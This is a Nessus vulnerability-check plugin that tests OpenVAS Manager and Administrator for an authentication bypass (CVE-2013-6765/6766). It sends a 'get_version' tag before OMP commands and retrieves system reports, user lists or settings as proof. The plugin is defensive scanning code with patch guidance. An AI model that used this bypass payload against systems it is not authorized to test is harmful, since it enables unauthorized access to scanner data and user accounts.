#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70919);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/17 15:28:25 $");

  script_cve_id("CVE-2013-6765", "CVE-2013-6766");
  script_bugtraq_id(63632, 63634);
  script_osvdb_id(99678, 99679);
  script_xref(name:"EDB-ID", value:"34026");

  script_name(english:"OpenVAS Administrator / Manager Authentication Bypass");
  script_summary(english:"Tries to exploit authentication bypass vulnerability");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a security scanner management service that
is affected by an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to exploit an authentication bypass vulnerability by
sending the 'get_version' command. Successful exploitation of this
vulnerability could allow a remote attacker to take complete control
of an OpenVAS install.");
  # http://lists.wald.intevation.org/pipermail/openvas-announce/2013-November/000157.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9eda0db5");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2013/Nov/79");
  script_set_attribute(attribute:"solution", value:
"Upgrade to OpenVAS Manager 4.0.4 / 3.0.7 or higher, and OpenVAS
Administrator 1.3.2 / 1.2.2 or higher.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/11/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/11/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openvas:openvas_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("openvas_manager_administrator_detect.nasl");
  script_require_ports("Services/openvasmd");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

function run_command(cmd, args, port, help_res, exit_on_fail)
{
  local_var res, tag, item, soc, data;

  if (isnull(exit_on_fail)) exit_on_fail = FALSE;

  soc = open_sock_tcp(port);
  if (!soc)
  {
    if (exit_on_fail) audit(AUDIT_SOCK_FAIL, port);
    else return NULL;
  }

  if (isnull(args))
    args = '';

  if (toupper(cmd) >< help_res || isnull(help_res))
  {
    tag = '<get_version/><' + cmd + ' ' + args + '/>';

    send(socket:soc, data:tag);
    res = recv(socket:soc, length:10000, min:strlen(tag+'_response'));
    close(soc);

    if ('status_text="OK"' >!< res || 'status="200"' >!< res ||
       '</' + cmd + '_response>' >!< res || '<' + cmd + '_response' >!< res)
      return NULL;

    item = eregmatch(pattern: '<' + cmd + '_response[^>]*>',
                     string: res);
    if (isnull(item) || isnull(item[0])) return NULL;

    data = strstr(res, item[0]);
    data -= item[0];
    data -= ('</' + cmd + '_response>');

    if (chomp(data) != '') return chomp(data);
    else return NULL;
  }
  else return NULL;
}

interesting_commands =
make_list(
  'get_system_reports',
  'get_users',
  'get_settings'
);

interesting_command_args = make_array();
interesting_command_args['get_system_reports']  = 'brief="1"';

port = get_service(svc:"openvasmd", exit_on_fail:TRUE);

if (!get_tcp_port_state(port))
  audit(AUDIT_PORT_CLOSED, port);

info = run_command(cmd:'help', port:port, exit_on_fail:TRUE);

command = 'HELP';
if (info != '' && 'HELP' >< info && 'COMMANDS' >< info)
{
  # run through some more interesting commands and see if we can
  # get something cool for the report
  foreach cmd (interesting_commands)
  {
    args = interesting_command_args[cmd];
    if (isnull(args)) args = '';

    res = run_command(cmd:cmd, args:args, port:port, help_res:info, exit_on_fail:FALSE);
    if (!isnull(res))
    {
      info = res;
      command = toupper(cmd);
      break;
    }
  }

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to bypass authentication and run the "' + command + '"' +
      '\n' + 'command as an authenticated user.';
    if (report_verbosity > 1)
      report += ' Here is the command output :\n\n' + info;
    report += '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_LISTEN_NOT_VULN, "OpenVAS Manager / Administrator", port);
